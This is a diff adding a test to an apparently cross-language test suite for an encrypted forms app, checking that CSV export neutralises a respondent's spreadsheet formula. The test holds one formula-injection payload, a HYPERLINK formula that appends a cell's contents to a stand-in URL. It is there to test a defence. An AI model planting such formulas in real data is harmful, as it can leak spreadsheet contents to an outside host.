@@ -73,6 +73,15 @@ for (const layers of [1, 0]) {
       assert.ok(await until(b, async () => (await b.call("snapshot")).state.forms[fP].myConfirmed), "desktop sees the phone's receipt");
       assert.match(phone.exportCsv(fP).csv, /,yes,x; y\n$/, "phone CSV renders option text + receipt");
 
+      // 2b. a respondent's spreadsheet formula is neutralised in the CSV, the same in JS and C++
+      const fF = phone.createForm({ title: "Formula", questions: [{ id: "q1", type: "textarea", text: "Say", required: true }, { id: "q2", type: "number", text: "N", required: false, min: -10, max: 10 }] }).formId;
+      assert.ok(await until(b, async () => !!(await b.call("snapshot")).state.forms[fF]), "desktop admits the formula form");
+      assert.ok((await b.call("submitResponse", [fF, JSON.stringify([{ questionId: "q1", value: '=HYPERLINK("https://example.invalid/?"&A1,"x")' }, { questionId: "q2", value: -5 }])])).ok);
+      assert.ok(await until(b, () => (phone.snapshot().creatorView?.responses[fF] || []).length === 1), "phone decrypts the formula answer");
+      const csvF = phone.exportCsv(fF).csv;
+      assert.ok(csvF.includes(`"'=HYPERLINK`) && !/,"?=HYPERLINK/.test(csvF), "phone CSV neutralises a formula answer: " + csvF);
+      assert.ok(/,-5(\n|$)/.test(csvF), "...and keeps a negative number a number");
+
       // 3. members-only form listing the phone: inner signature made in JS, verified in C++
       const fW = (await b.call("createForm", [JSON.stringify({ title: "Members", questions: [{ id: "q1", type: "text", text: "Hi", required: true }],
         whitelist: { type: "addresses", value: phone.identity.address } })])).formId;
